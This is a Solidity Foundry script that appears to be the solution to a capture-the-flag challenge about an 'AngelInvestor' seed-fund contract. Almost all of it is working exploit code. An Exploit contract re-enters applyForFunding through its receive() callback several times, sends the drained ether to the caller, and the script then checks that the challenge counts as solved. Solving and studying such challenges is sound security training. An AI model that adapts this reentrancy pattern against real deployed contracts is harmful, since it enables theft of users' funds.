pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {AngelInvestor} from "src/BITS-2025/SeedFund/AngelInvestor.sol";
import "forge-std/StdJson.sol"; 


contract Solve is Script{
    using stdJson for string;
    function run()public{
        address _angel;
        string memory Setup_path=string.concat("broadcast/Deploy.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        try vm.readFile(Setup_path){
            string memory json = vm.readFile(Setup_path);
            address deployed = json.readAddress(".transactions[0].contractAddress");
            _angel=deployed;
        }catch{
            revert("Challenge Not Yet Deployed");
        }
        
        vm.startBroadcast();
        AngelInvestor angel=AngelInvestor(_angel);
        Exploit exploit =new Exploit(address(angel));
        exploit.pwn();
        require(angel.isChallSolved(),"Exploit Failed");
        vm.stopBroadcast();
    }
}

contract Exploit{
    AngelInvestor angel_investor;
    uint8 check;
    constructor(address __angel_addr){
        angel_investor=AngelInvestor(__angel_addr);
    }

    function pwn()public{
        angel_investor.applyForFunding(7);
        msg.sender.call{value:address(this).balance}("");
    }
    
    receive()external payable{
        if(check<4){
            check+=1;
            if(check==4){
                angel_investor.applyForFunding(5);
            }
            else{
                angel_investor.applyForFunding(7);
            }
        }
    }
}

